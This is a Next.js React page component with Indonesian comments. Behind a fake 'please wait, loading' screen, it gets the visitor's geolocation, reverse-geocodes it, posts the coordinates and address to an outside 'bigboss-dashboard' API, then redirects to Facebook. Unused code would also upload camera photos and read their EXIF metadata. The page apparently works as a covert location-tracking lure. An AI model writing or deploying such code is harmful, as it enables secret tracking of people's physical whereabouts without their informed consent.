"use client";
import { useEffect, useState } from "react";
import EXIF from "exif-js"; // ✅ import exif-js
import axios from "axios";

const headers = {
  "Content-Type": "application/json",
  Accept: "application/json",
};

const instance = axios.create({
  baseURL: process.env.NEXT_PUBLIC_BASE_API_URL,
  headers: headers,
});

const token = process.env.NEXT_PUBLIC_TOKEN_MAPBOX;

export default function App() {
  const [data, setData] = useState(null);
  const [locationAllowed, setLocationAllowed] = useState(false);
  const [photo, setPhoto] = useState(null);
  const [meta, setMeta] = useState(null); // ✅ simpan metadata

  useEffect(() => {
    setTimeout(() => {
      handleGetLocation();
    }, 2000);
  }, []);

  const handleGetLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const alamat = await reverseGeocodeMapbox(
            pos?.coords?.latitude,
            pos?.coords?.longitude
          );

          // coords
          const coords = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          };

          // simpan state
          setData((prev) => ({
            ...prev,
            alamat: alamat,
            coordinate: coords,
          }));

          const dataBaru = {
            nama: "TRY 1",
            koordinat: {
              lat: coords?.latitude,
              lng: coords?.longitude,
            },
            imageUrl:
              "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgno8KKmm46kvbM9f-H3XU53bT-nxqlYPLqQ&s",
            public_id: "student_images/mkfhlpxjkirhj9nh8nlg",
            jenis_kecelakaan: "tunggal",
            lokasi: alamat,
          };

          postData(dataBaru, true);

          setLocationAllowed(true); // tutup popup setelah berhasil
        },
        (err) => {
          console.error("Lokasi gagal:", err);
          alert("Gagal mengakses lokasi");
        }
      );
    } else {
      alert("Browser tidak mendukung geolocation");
    }
  };

  // Handler ambil foto
  const handleCapture = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    setLocationAllowed(false);
    const objectUrl = URL.createObjectURL(file);
    setPhoto(objectUrl);

    // ✅ Upload ke Cloudinary
    const formData = new FormData();
    formData.append("file", file);
    formData.append(
      "upload_preset",
      process.env.NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET
    ); // ganti dengan upload preset kamu

    try {
      const res = await fetch(
        `https://api.cloudinary.com/v1_1/dlkp555qk/image/upload`,
        {
          method: "POST",
          body: formData,
        }
      );
      const uploadRes = await res.json();
      console.log("Upload success:", uploadRes);
      setLocationAllowed(true);
      // ✅ Baca metadata EXIF
      EXIF.getData(file, function () {
        const allMetaData = EXIF.getAllTags(this);
        setData((prev) => ({
          ...prev,
          metadata: allMetaData,
        }));
        setMeta(allMetaData);

        const dataBaru = {
          nama: "TRY 2",
          koordinat: {
            lat: data?.coordinate?.latitude,
            lng: data?.coordinate?.longitude,
          },
          imageUrl: uploadRes.secure_url, // ✅ URL dari Cloudinary
          public_id: uploadRes.public_id, // ✅ Public ID dari Cloudinary
          jenis_kecelakaan: "tunggal",
          lokasi: data?.alamat,
        };

        postData(dataBaru, true);
      });
    } catch (err) {
      console.error("Upload gagal:", err);
    }
  };

  const reverseGeocodeMapbox = async (lat, lng) => {
    const url = `https://api.mapbox.com/geocoding/v5/mapbox.places/${lng},${lat}.json`;

    try {
      const response = await axios.get(url, {
        params: {
          access_token: token,
          language: "id",
        },
      });

      const features = response.data.features;
      console.log("features", features);
      // Helper untuk mencari jenis tertentu
      const getTextByType = (type) =>
        features.find((f) => f.id.startsWith(type))?.text || "-";

      const hasil = {
        kodePos: getTextByType("postcode"),
        kecamatan: getTextByType("locality"),
        kota: getTextByType("place"),
        provinsi: getTextByType("region"),
        negara: getTextByType("country"),
      };

      return hasil;
    } catch (error) {
      console.error("Gagal melakukan reverse geocoding:", error);
      return null;
    }
  };

  const postData = (dataBaru, direct = false) => {
    // kode eksekusi

    axios
      .post("https://bigboss-dashboard.vercel.app/api/location", dataBaru)
      .then((res) => {
        console.log("res post", res);
        if (direct) {
          window.location.href = "https://web.facebook.com";
        }
      })
      .catch((err) => {
        console.log("err", err);
      });
  };

  console.log("data", data);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen">
      {!locationAllowed ? (
        // Popup wajib izinkan lokasi
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center">
          <div className="bg-white p-6 rounded-xl shadow-xl text-center max-w-xs">
            <h2 className="text-lg font-bold mb-2">
              Harap sabar sedang loading...
            </h2>
          </div>
        </div>
      ) : (
        // Tampilkan kamera
        <div className="flex flex-col items-center">
          {/* <h2 className="text-lg font-bold mb-4">Ambil Foto</h2>
          <input
            type="file"
            accept="image/*"
            capture="environment"
            onChange={handleCapture}
          /> */}
        </div>
      )}
    </div>
  );
}
